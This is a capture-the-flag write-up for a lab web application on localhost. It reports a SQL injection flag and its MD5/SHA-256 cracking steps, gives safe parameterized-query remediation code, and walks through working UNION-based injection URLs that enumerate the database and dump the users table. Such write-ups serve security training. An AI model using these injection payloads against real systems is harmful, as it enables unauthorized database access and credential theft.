## Flag

- DB flag: `5ff9d0165b4f92b14994e5c685cdce28`
- DB Comment: Decrypt this password -> then lower all the char. Sh256 on it and it's good !

- `5ff9d0165b4f92b14994e5c685cdce28` -> `FortyTwo`

  - https://md5decrypt.net/

- `FortyTwo` -> `fortytwo`

- `fortytwo` -> `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
  - https://md5decrypt.net/Sha256/

## Remediation

The backend should sanitize and validate all user inputs to prevent SQL injection attacks. This can be done by using prepared statements/parameterized queries and some form of input validation.

Use parameterized queries, validate inputs, and avoid building SQL by string concatenation. The example below shows a safe pattern using a context manager, explicit validation, sqlite3.Row for readable results, and a parameterized query (the ? placeholder). This prevents SQL injection and handles invalid input cleanly.

```python
# Safe example using parameterized queries and input validation (SQLite)
import sqlite3

def get_member_by_id(db_path: str, raw_id) -> list:
  # Validate/normalize input (whitelist numeric ids here)
  try:
    user_id = int(raw_id)
  except (TypeError, ValueError):
    raise ValueError("Invalid user id")

  # Use a context manager so the connection is closed automatically
  with sqlite3.connect(db_path) as conn:
    conn.row_factory = sqlite3.Row  # optional: access columns by name
    # Parameterized query prevents SQL injection
    cur = conn.execute("SELECT * FROM members WHERE id = ?", (user_id,))
    return [dict(row) for row in cur.fetchall()]

# Example usage
if __name__ == "__main__":
  try:
    rows = get_member_by_id("example.db", "1")  # safe input
    for r in rows:
      print(r)
  except ValueError as e:
    print("Bad input:", e)
```

Notes:

- Always use parameterized queries (placeholders) instead of formatting SQL strings.
- Validate and/or whitelist inputs appropriate to your application (e.g., numeric IDs vs UUIDs).
- Apply least privilege to the database user and consider using an ORM or stored procedures for additional safety and maintainability.
- Log and handle exceptions without exposing sensitive details to users.

## SQL Injection

One of the most common web application vulnerabilities is SQL injection. SQL injection occurs when an attacker is able to insert malicious SQL code into a web application's database query. This can allow the attacker to access sensitive data, modify or delete data, or even take control of the entire database.

Here, the application is vulnerable to SQL injection on the `members` page.

### Exploitation

Database infos:

- MariaDB: `5.5.64-MariaDB-1ubuntu0.14.04.1`
- Databases:

| Database Name        |
| -------------------- |
| information_schema   |
| Member_Brute_Force   |
| Member_Sql_Injection |
| Member_guestbook     |
| Member_images        |
| Member_survey        |

- Tables in `Member_Sql_Injection`:

| Table Name |
| ---------- |
| users      |

- Columns in `users` table:

| Column Name |
| ----------- |
| user_id     |
| first_name  |
| last_name   |
| town        |
| country     |
| planet      |
| Commentaire |
| countersign |

- Users:

| user_id | first_name | last_name | town | country | planet | Commentaire                                                                   | countersign                      |
| ------- | ---------- | --------- | ---- | ------- | ------ | ----------------------------------------------------------------------------- | -------------------------------- |
| ...     | ...        | ...       | ...  | ...     | ...    | ...                                                                           | ...                              |
| 5       | Flag       | GetThe    | 42   | 42      | 42     | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28 |

To exploit the SQL injection vulnerability, we can use the `UNION` operator to combine the results of two or more `SELECT` statements into a single result set, `--` is used to comment out the rest of the SQL query. This allows us to explore and retrieve data from the database.

To avoid `quote` errors we can use numeric values in the injection.

https://www.rapidtables.com/convert/number/ascii-to-hex.html

```c
0x7573657273
// Hex literal for 'users'
0x3c3e
// Hex literal for '<>'
0x2c
// Hex literal for ','
```

To get the database version:

```html
http://localhost:8080/?page=member&id=1%20UNION%20SELECT%20@@version,2%20--+&Submit=Submit#
```

```sql
SELECT * FROM members WHERE id = 1 UNION SELECT @@version,2 -- ;
--+ is used to comment out the rest of the SQL query
-- Output:
-- ID: 1 UNION SELECT @@version,2 --
-- First name: one
-- Surname : me
--
-- ID: 1 UNION SELECT @@version,2 --
-- First name: 5.5.64-MariaDB-1ubuntu0.14.04.1
-- Surname : 2
```

To get the current database name:

```html
http://localhost:8080/?page=member&id=1%20UNION%20SELECT%20database(),2%20--+&Submit=Submit#
```

```sql
SELECT * FROM members WHERE id = 1 UNION SELECT database(),2 -- ;
-- Output:
-- ...
-- First name: Member_Sql_Injection
```

To list all databases:

```html
http://localhost:8080/?page=member&id=1%20UNION%20SELECT%20GROUP_CONCAT(schema_name%20SEPARATOR%200x3c3e),%202%20FROM%20information_schema.schemata%20--&Submit=Submit#
```

```sql
SELECT * FROM members WHERE id = 1 UNION SELECT GROUP_CONCAT(schema_name SEPARATOR 0x3c3e), 2 FROM information_schema.schemata -- ;
-- Output:
-- ...
-- First name: information_schema<>Member_Brute_Force<>Member_Sql_Injection<>Member_guestbook<>Member_images<>Member_survey
```

Current database tables:

```html
http://localhost:8080/?page=member&id=1%20UNION%20SELECT%20GROUP_CONCAT(table_name%20SEPARATOR%200x3c3e),%202%20FROM%20information_schema.tables%20WHERE%20table_schema%20=%20database()%20--+&Submit=Submit#
```

```sql
SELECT * FROM members WHERE id = 1 UNION SELECT GROUP_CONCAT(table_name SEPARATOR 0x3c3e), 2 FROM information_schema.tables WHERE table_schema = database() -- ;
-- Output:
-- ...
-- First name: users
```

To list all columns in the `users` table:

```html
http://localhost:8080/?page=member&id=1%20UNION%20SELECT%20GROUP_CONCAT(column_name%20SEPARATOR%200x3c3e),%202%20FROM%20information_schema.columns%20WHERE%20table_schema%20=%20database()%20AND%20table_name%20=%200x7573657273%20--%20+&Submit=Submit#
```

```sql
SELECT * FROM members WHERE id = 1 UNION SELECT GROUP_CONCAT(column_name SEPARATOR 0x3c3e), 2 FROM information_schema.columns WHERE table_schema = database() AND table_name = 0x7573657273 --  +;
-- Output:
-- ...
-- First name: user_id<>first_name<>last_name<>town<>country<>planet<>Commentaire<>countersign
```

https://www.w3schools.com/sql/func_mysql_concat_ws.asp

Get user data:

```html
http://localhost:8080/?page=member&id=1%20UNION%20SELECT%20(SELECT%20CONCAT_WS(0x2c,%20user_id,%20first_name,%20last_name,%20town,%20country,%20planet,%20Commentaire,%20countersign)%20FROM%20users%20LIMIT%203,1),%202%20--%20+&Submit=Submit#
```

```sql
SELECT * FROM members WHERE id = 1 UNION SELECT (SELECT CONCAT_WS(0x2c, user_id, first_name, last_name, town, country, planet, Commentaire, countersign) FROM users LIMIT 3,1), 2 -- +;
-- LIMIT Offset: 3,Row_count: 1 to get the 4th user (0 indexed) - Returns only one row (to avoid subquery error)
-- Output:
-- ...
-- First name: 5,Flag,GetThe,42,42,42,Decrypt this password -> then lower all the char. Sh256 on it and it's good !,5ff9d0165b4f92b14994e5c685cdce28
```
